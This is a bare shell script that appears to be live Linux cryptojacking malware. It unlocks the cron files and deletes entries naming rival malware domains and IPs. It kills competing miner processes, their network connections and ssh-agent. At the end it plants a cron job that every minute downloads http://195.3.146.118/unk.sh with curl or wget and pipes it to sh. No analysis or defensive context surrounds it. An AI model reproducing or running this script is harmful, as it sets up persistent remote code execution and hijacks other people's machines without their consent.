#!/bin/sh
LDR="wget -q -O -"
if [ -s /usr/bin/curl ]; then
  LDR="curl"
fi
if [ -s /usr/bin/wget ]; then
  LDR="wget -q -O -"
fi
chattr -R -i /var/spool/cron
chattr -i /etc/crontab
crontab -l | sed '/update.sh/d' | crontab -
crontab -l | sed '/logo4/d' | crontab -
crontab -l | sed '/logo9/d' | crontab -
crontab -l | sed '/logo0/d' | crontab -
crontab -l | sed '/logo/d' | crontab -
crontab -l | sed '/tor2web/d' | crontab -
crontab -l | sed '/jpg/d' | crontab -
crontab -l | sed '/png/d' | crontab -
crontab -l | sed '/tmp/d' | crontab -
crontab -l | sed '/zmreplchkr/d' | crontab -
crontab -l | sed '/aliyun.one/d' | crontab -
crontab -l | sed '/3.215.110.66.one/d' | crontab -
crontab -l | sed '/pastebin/d' | crontab -
crontab -l | sed '/onion/d' | crontab -
crontab -l | sed '/lsd.systemten.org/d' | crontab -
crontab -l | sed '/shuf/d' | crontab -
crontab -l | sed '/ash/d' | crontab -
crontab -l | sed '/mr.sh/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/localhost.xyz/d' | crontab -
crontab -l | sed '/45.137.151.106/d' | crontab -
crontab -l | sed '/111.90.159.106/d' | crontab -
crontab -l | sed '/github/d' | crontab -
crontab -l | sed '/bigd1ck.com/d' | crontab -
crontab -l | sed '/xmr.ipzse.com/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/146.71.79.230/d' | crontab -
crontab -l | sed '/122.51.164.83/d' | crontab -
crontab -l | sed '/newdat.sh/d' | crontab -
crontab -l | sed '/lib.pygensim.com/d' | crontab -
crontab -l | sed '/t.amynx.com/d' | crontab -
crontab -l | sed '/update.sh/d' | crontab -
pkill -f sysupdate
pkill -f phpguard
pkill -f phpupdate
pkill -f networkmanager
pkill -f /tmp/init12.cfg
pkill -f kieuanilam.me
pkill -f networkservice
pkill -f sysguard
ps aux| grep "sleep 60"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
ps aux| grep "./crun"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
pgrep -f ./watchbog | xargs -I % kill -9 %
netstat -antp | grep '108.174.197.76' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '192.236.161.6' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '88.99.242.92' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
systemctl stop c3pool_miner.service
pkill -f pastebin
pkill -f ssh-agent
pkill -f 185.193.127.115
crontab -l | grep -e "195.3.146.118" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo "* * * * * $LDR http://195.3.146.118/unk.sh | sh > /dev/null 2>&1"
  ) | crontab -
fi